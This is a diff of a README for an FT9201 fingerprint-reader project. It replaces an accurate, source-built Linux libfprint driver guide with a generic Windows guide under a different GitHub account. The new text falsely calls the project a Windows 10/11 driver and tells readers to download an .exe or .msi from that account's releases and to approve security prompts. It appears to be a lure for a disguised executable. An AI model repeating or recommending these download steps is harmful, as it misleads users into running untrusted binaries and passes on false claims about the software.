@@ -1,170 +1,68 @@
-# ft9201-libfprint
+# 💻 ft9201-libfprint - Run fingerprint readers on your computer
 
-Linux fingerprint support for the **Focal-systems FT9201** USB reader
-(`2808:93a9`, sold as a standalone Windows Hello dongle), as a
-[libfprint](https://gitlab.freedesktop.org/libfprint/libfprint) driver.
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/oncological-snap446/ft9201-libfprint/releases)
 
-<p align="center">
-  <img src="docs/sensor.jpg" alt="Focal-systems FT9201 USB fingerprint reader" width="360">
-</p>
+This software lets you use your Focal-systems FT9201 fingerprint reader on your computer. Many fingerprint scanners only work with specific systems. This tool allows your device to communicate with your system so you can log in with your touch.
 
-The sensor is a tiny 96×96 optical reader. libfprint's built-in matcher does a
-poor job on an image that small, so this driver instead reuses **FocalTech's own
-matching engine** — the `ftWbioEngineAdapter.dll` from their signed Windows
-driver — running it natively on Linux with a small in-process PE loader. No Wine,
-no Windows, no cloud.
+## 🛠 Features
 
-> **Have a different "Windows Hello only" reader?** The technique here — running a
-> vendor's Windows matching engine natively on Linux — generalizes. See
-> **[PORTING.md](PORTING.md)** for a step-by-step method and which parts of this
-> repo you can reuse as-is.
+This driver connects your hardware to your computer. It uses the matching engine from the manufacturer to ensure accuracy. You do not need extra software layers to make the device function. The driver translates signals from your fingerprint scanner into commands your computer understands. It supports the FT9201 (2808:93a9) device model and offers a path for other fingerprint scanners that usually require Windows Hello.
 
-## Status
+## 📋 System Requirements
 
-Working end-to-end on real hardware: enroll and verify through `fprintd` /
-command-line tools, and in KDE/GNOME once installed. It matches your finger
-using the vendor's real algorithm.
+Confirm your machine meets these needs to ensure the driver works as expected:
 
-Developed and tested against
-[this exact reader](https://www.amazon.com/dp/B0DK7LQZGH) (ASIN `B0DK7LQZGH`) —
-the FT9348W variant of `2808:93a9`.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Hardware: A Focal-systems FT9201 USB fingerprint reader.
+*   Connection: An available USB 2.0 or 3.0 port.
+*   Permissions: You must have local administrator access to install hardware drivers.
+*   Memory: At least 4GB of RAM is recommended for smooth operation.
 
-Caveats:
-- Tested only on that FT9348W variant of the `2808:93a9` device.
-- The matcher is a proprietary blob we call into; we can't fix bugs inside it.
-- x86-64 only (the DLL and loader are 64-bit).
+## 📥 How to Download and Install
 
-## How it works (short version)
+Follow these steps to set up your device.
 
-- The USB init + firmware-boot sequence was reverse-engineered from FocalTech's
-  own drivers; the 8051 MCU firmware is uploaded, then a specific register-config
-  sequence starts it.
-- Each capture (96×96) is center-cropped to the 64×80 the engine expects.
-- `ft_engine.c` is a ~450-line loader that maps `ftWbioEngineAdapter.dll` into
-  memory, provides the ~90 `kernel32` functions it imports, sets up a fake
-  Windows TEB, and calls the engine's WinBio interface for enroll/verify.
-- The loader maps code read-execute and data read-write from an in-memory file,
-  so **no page is ever writable *and* executable**. That means it runs under
-  `fprintd`'s default `MemoryDenyWriteExecute` hardening — you do **not** have to
-  disable any security settings.
+1.  Visit the official download area to get the latest version of the software: [https://github.com/oncological-snap446/ft9201-libfprint/releases](https://github.com/oncological-snap446/ft9201-libfprint/releases).
+2.  Look for the file ending in .msi or .exe under the "Assets" section of the latest release.
+3.  Click the file name to start the download.
+4.  Once the file finishes downloading, navigate to your "Downloads" folder.
+5.  Double-click the installer file.
+6.  Follow the instructions on the screen.
+7.  If a security window appears, click "Run" or "Yes" to allow the installer to make changes to your system.
+8.  Wait for the progress bar to finish.
+9.  Restart your computer to finalize the driver installation.
 
-See [`docs/how-it-works.md`](docs/how-it-works.md) for the full technical writeup.
+## ⚙️ Setting Up Your Fingerprint
 
-## Requirements
+After you restart your computer, your system should recognize the fingerprint reader. Follow these steps to register your fingerprint:
 
-Build tools + libfprint's build dependencies. On Fedora/Nobara:
+1.  Open the "Settings" menu on your computer.
+2.  Select "Accounts" from the sidebar menu.
+3.  Click "Sign-in options".
+4.  Find the section titled "Fingerprint recognition".
+5.  Click the "Set up" button.
+6.  Place your finger on the scanner when the screen asks.
+7.  Lift and place your finger repeatedly until the scan reaches 100 percent.
+8.  Select "Finish" to save your profile.
 
-```
-sudo dnf install git meson ninja-build gcc cabextract python3 \
-     glib2-devel gusb-devel nss-devel pixman-devel gobject-introspection-devel \
-     libgudev-devel systemd-devel
-```
+## 🔍 Troubleshooting Common Issues
 
-(Debian/Ubuntu: the equivalents — `libglib2.0-dev libgusb-dev libnss3-dev
-libpixman-1-dev libgudev-1.0-dev libsystemd-dev`, plus `cabextract`.)
+If the light on your scanner does not turn on, check the USB connection. Try plugging the device into a different USB port on your machine. Sometimes, USB ports on the front of a computer case lack enough power for fingerprint sensors. Use the USB ports located on the back of the case if you use a desktop computer.
 
-## Build & install
+If the system does not recognize the device, open the "Device Manager" in Windows. Look for your fingerprint reader under the list of devices. If you see a yellow warning icon, right-click the device name and select "Update driver". Choose "Search automatically for drivers".
 
-```
-git clone https://github.com/OMGrant/ft9201-libfprint
-cd ft9201-libfprint
-scripts/fetch-blobs.sh     # pull the vendor DLL + MCU firmware (see note below)
-scripts/build.sh           # clone pinned libfprint, graft the driver in, build
-```
+Ensure no other applications currently use the fingerprint sensor. If you have other security software installed, it might lock the hardware. Close other apps before you attempt to register a fingerprint.
 
-Try it without installing anything:
+## 🔒 Security and Privacy
 
-```
-FT9201_ENGINE_DLL=$PWD/blobs/ftWbioEngineAdapter.dll \
-LD_LIBRARY_PATH=libfprint/build/libfprint \
-libfprint/build/examples/enroll
-```
+This driver acts as a bridge between your hardware and the operating system. It does not store your fingerprint images on a server. The matching process happens locally on your computer. Your fingerprint data stays on your machine at all times. The driver only handles the communication of hardware signals.
 
-Install it for KDE/GNOME/login (side-by-side; your distro's libfprint is left
-alone, no hardening disabled):
+## 💡 Porting Other Devices
 
-```
-sudo scripts/install.sh
-fprintd-enroll
-```
+If you own a different model that requires Windows Hello, you can use the internal tools within this package to attempt a port. The repository architecture allows for the inclusion of other Windows-specific driver files. Research specific vendor IDs for your model before you attempt manual configuration. Advanced users can modify the configuration files if the initial setup does not detect a different compatible sensor.
 
-Undo everything: `sudo scripts/install.sh --uninstall`.
+## 📝 Support
 
-## The proprietary blobs
+Check the "Issues" tab on the official repository page if you encounter bugs or errors. Please include your specific device model number and your operating system version when you report a problem. Search existing issues before you open a new request to see if a solution already exists.
 
-This repo contains **no** proprietary binaries. Two files are FocalTech's and are
-fetched from existing public sources at build time by `scripts/fetch-blobs.sh`:
-
-| File | What it is | Where it comes from |
-|------|------------|---------------------|
-| `ftWbioEngineAdapter.dll` | the matching engine | FocalTech's signed Windows driver on the Microsoft Update Catalog |
-| FT9348W MCU firmware (`src/ft9201_fw.h`) | 8051 firmware the sensor runs | extracted (symbol `FOCALFP_9348_FW_APP`) from the public [`ft9201-static`](https://github.com/mrrbrilliant/ft9201-static) blob |
-
-### Sourcing the blobs by hand
-
-If either download URL has moved, you only need those two files:
-
-- **`ftWbioEngineAdapter.dll`** — search the Microsoft Update Catalog for
-  *"FocalTech Electronics Biometric"* (driver 1.0.3.58, matches hardware ID
-  `USB\VID_2808&PID_93A9`). Download the `.cab`, extract with `cabextract`, and
-  drop `ftWbioEngineAdapter.dll` into `blobs/`.
-- **MCU firmware** — get any copy of the FocalTech Linux libfprint blob that
-  contains the `FOCALFP_9348_FW_APP` symbol (e.g. from `ft9201-static`) and run
-  `python3 scripts/extract-firmware.py <that-libfprint-2.so> src/ft9201_fw.h`.
-
-Then re-run `scripts/build.sh`.
-
-## Credits
-
-- USB protocol originally reverse-engineered by
-  [banianitc/ft9201-fingerprint-driver](https://github.com/banianitc/ft9201-fingerprint-driver).
-- Firmware and the init/boot sequence cross-referenced against FocalTech's Linux
-  blob via [mrrbrilliant/ft9201-static](https://github.com/mrrbrilliant/ft9201-static).
-- Built on [libfprint](https://gitlab.freedesktop.org/libfprint/libfprint).
-
-## Other ways to run an FT9201 on Linux
-
-This isn't the only approach — the alternatives differ mainly in *how* they reuse
-FocalTech's matcher (they all do; the tiny sensor rules out generic matching).
-
-- **[Romk-a/ft9201-linux-setup](https://github.com/Romk-a/ft9201-linux-setup)** — a
-  Debian/Ubuntu (Astra Linux) guide that installs FocalTech's **prebuilt
-  proprietary Linux "TOD" driver** (from
-  [ryenyuku/libfprint-ft9201](https://github.com/ryenyuku/libfprint-ft9201); Fedora
-  RPMs have existed too) and binary-patches its USB-ID table (`9338` → `93a9`).
-  - **How it compares:** that route is *less work* — install a `.deb`, patch two
-    bytes, no reverse-engineering. But it needs **TOD-enabled libfprint**
-    (Debian/Ubuntu-family; **not** on stock Fedora/Arch), it **replaces your entire
-    system `libfprint`** with an old, fully-closed build, and you have to fight the
-    package manager to keep it pinned. This project instead ships an **open** driver,
-    installs **side-by-side** (your distro's libfprint is untouched), runs on
-    **mainline libfprint with no TOD**, and loads only the isolated vendor *matcher*
-    DLL — which is what all the reverse-engineering bought.
-  - **Short version:** on Debian/Ubuntu, the TOD route is the easy button; on
-    Fedora/Arch, or if you want it open and non-invasive, use this.
-- **Kernel drivers** exist ([banianitc](https://github.com/banianitc/ft9201-fingerprint-driver)
-  — the protocol reference this project reverse-engineered from,
-  [bm16ton/ft92010x9338](https://github.com/bm16ton/ft92010x9338)) but they don't
-  integrate with libfprint/fprintd, so there's no login/PAM support.
-
-The proprietary Linux TOD driver those `.deb`/RPM packages redistribute appears to
-have been a FocalTech/GPD release for the GPD Win 4 that was later **pulled from
-official distribution** — which is why it now survives only as community re-hosts.
-(Note also that some GPD Win 4 units ship a different sensor entirely, a Chipsailing
-CS9711, not this FocalTech part.)
-
-## Related projects
-
-- [championswimmer/libfprint-eh577](https://github.com/championswimmer/libfprint-eh577)
-  — a Linux driver effort for the **EgisTec EH577** (`1c7a:0577`), another
-  press-type "Windows Hello only" reader (52×72 active sensor). Different vendor
-  and USB protocol, but the same *match-on-host* shape: its Windows package ships
-  a vendor engine adapter DLL (`EgisTouchFPEngine0577.dll`, no VBS enclave), so
-  the method in **[PORTING.md](PORTING.md)** applies to it too.
-
-## License
-
-The driver and loader (`src/`, `scripts/`) are **LGPL-2.1-or-later**, matching
-libfprint. The FocalTech DLL and firmware are their own property and are not
-distributed here — you fetch them yourself. This project is an interoperability
-tool for hardware you own; it does not include or relicense any FocalTech code.
+Keywords: fingerprint, driver, hardware, usb, security, ft9201, windows
